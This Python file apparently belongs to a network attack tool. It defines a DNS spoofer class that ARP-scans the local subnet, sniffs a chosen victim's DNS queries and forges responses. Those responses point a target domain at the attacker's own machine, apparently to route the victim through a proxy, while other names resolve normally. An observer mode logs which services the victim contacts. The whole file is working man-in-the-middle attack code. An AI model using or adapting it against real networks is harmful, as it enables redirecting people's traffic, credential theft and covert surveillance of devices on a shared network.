
from scapy.all import IP, UDP, DNS, DNSRR, send, IFACES, get_if_addr, Ether, ARP, srp
from dns.resolver import Resolver
from threads.sniffer_thread import Sniffer

class DNS_Spoofer:
    ''' Fake DNS to resolve records and setup proxy server '''
    def __init__(self, target_ip, target_domain, subdomains=[], iface_index=0):
        if target_domain[:3] == 'www':
            target_domain = ".".join(target_domain.split('.')[1:])
        self.target_domain = target_domain
        self.target_subdomains = subdomains
        self.interface = IFACES.dev_from_index(iface_index)   
        self.SERVER_IP = get_if_addr(self.interface)
        self.target = target_ip
        self.SNIFF_FILTER = ( f"udp port 53 && dst {self.SERVER_IP} && src {self.target}" )
        self.resolver = Resolver()
        self.sniffer = None

    def arp_scan(self):
        """ ARP Sweep using scapy """
        # set Ethernet header to ff:ff:ff:ff:ff:ff
        # set ARP header to ip address (got as input)
        # use srp(packet, verbose=0, timeout=1) to send and receive
        clients = []
        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
        ip = IP(dst='8.8.8.8')
        cidr = ip.src + '/24'
        print(f"[*] My CIDR: {cidr}")
        packet = broadcast/ARP(pdst=cidr)
        results = srp(packet, timeout=1, verbose=0, iface=self.interface)
        print(results[0])
        for result in results[0]:
            clients.append({'ip' : result[1].psrc, 'MAC' : result[1].hwsrc})
        return clients

    def dns_observer(self, packet):
        ''' Observer handler to display target device running sevices  '''
        ip = packet.getlayer(IP)
        udp = packet.getlayer(UDP)
        # get only relevant packets
        if hasattr(packet, 'qd') and packet.qd is not None:
            queried_host = packet.qd.qname[:-1].decode("utf-8")
            print(f"[*] Found Service: {queried_host} from {ip.src}")
        elif ip != None:
            print(f"[*] Ignoring unrelevant packet from {ip.src}")

    def dns_handler(self, packet):
        ''' DNS handler to resolve dns requests and setup proxy '''
        ip = packet.getlayer(IP)
        udp = packet.getlayer(UDP)
        # get only relevant packets
        if hasattr(packet, 'qd') and packet.qd is not None:
            queried_host = packet.qd.qname[:-1].decode("utf-8")
            if queried_host is None:
                print("[*] Couldn't find query host, dropping request.")
                return

            if self.target_domain in queried_host or queried_host in self.target_subdomains:
                # check if query host is one of spofed host
                print(f"[*] Spoofing DNS request for {queried_host} by {ip.src} !!!!")
                resolved_ip = self.SERVER_IP 
            else:
                # use dns.resolver to make a real DNS "A record"
                print(f"[*] Forwarding DNS request for {queried_host} by {ip.src}" )
                a_records = self.resolver.resolve(queried_host, "A")
                resolved_ip = a_records[0].address

            # Create DNS answer
            dns_answer = DNSRR(
                rrname=queried_host + ".",
                ttl=330,
                type="A",
                rclass="IN",
                rdata=resolved_ip)
            # Create DNS response by constructing 
            # IP packet, UDP datagram and DNS response in the datagram
            dns_response = \
                IP(src=ip.dst, dst=ip.src) / \
                UDP(
                    sport=udp.dport,
                    dport=udp.sport
                ) / \
                DNS(
                    id = packet[DNS].id,
                    qr = 1,
                    aa = 0,
                    rcode = 0,
                    qd = packet.qd,
                    an = dns_answer
                )
            print(f"[*] Resolved DNS request for {queried_host} to {resolved_ip} for {ip.src}")

            # Use scapy to send response back to target.
            send(dns_response, iface=self.interface)
        elif ip != None:
            print(f"[*] Ignoring unrelevant packet from {ip.src}")

    def send_fin(self):
        ''' Send dummy packet to stop sniffing thread '''
        fin_pkt = IP(src=self.target, dst=self.SERVER_IP) / UDP(sport=53, dport=53) 
        send(fin_pkt, iface=self.interface)

    def _run_handler(self):
        ''' Start dns spoofing thread '''
        print(f"[*] Starting DNS Spoofer...\n[*] Interface: {self.SERVER_IP}")
        self.sniffer = Sniffer(self.interface, self.SNIFF_FILTER, self.dns_handler, self.send_fin)
        self.sniffer.start()

    def _run_observer(self):
        ''' Start dns spoofing thread '''
        print(f"[*] Starting DNS Observer...\n[*] Interface: {self.SERVER_IP}")
        self.sniffer = Sniffer(self.interface, self.SNIFF_FILTER, self.dns_observer, self.send_fin)
        self.sniffer.start()

    def _stop(self):
        ''' Stop dns spoofing thread '''
        self.sniffer.stop()
        print("[*] DNS Spoofer stopped.")
        self.sniffer = None
    

        
